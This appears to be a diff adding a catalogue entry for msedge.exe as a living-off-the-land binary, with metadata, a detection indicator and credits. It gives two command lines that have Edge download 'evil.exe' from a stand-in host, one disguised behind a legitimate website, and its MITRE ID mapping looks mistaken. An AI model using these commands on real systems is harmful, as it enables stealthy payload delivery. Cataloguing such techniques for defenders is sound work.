@@ -1,0 +1,30 @@
+---
+Name: msedge.exe
+Description: Microsoft edge web browser.
+Author: Ido Veltzman
+Created: 09.05.2021
+Commands:
+  - Command: msedge.exe http://evilcorp:8080/evil.exe
+    Description: Download payload from remote server.
+    Usecase: It will download payload from remote server and place in the defined download folder.
+    Category: Download
+    Privileges: User
+    MitreID: T1055
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1055
+    OperatingSystem: Windows 10 All
+  - Command: msedge.exe https://www.google.com http://evilcorp:8080/evil.exe
+    Description: Download payload from remote server in disguise of legit website.
+    Usecase: It will download payload from remote server and place in the defined download folder.
+    Category: Download
+    Privileges: User
+    MitreID: T1055
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1055
+    OperatingSystem: Windows 10 All
+Full_Path:
+  - Path: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+Detection: 
+  - IOC: Non msedge.exe process spawned under msedge.exe
+Acknowledgement:
+  - Person: Ido Veltzman
+    Handle: @idov31
+---
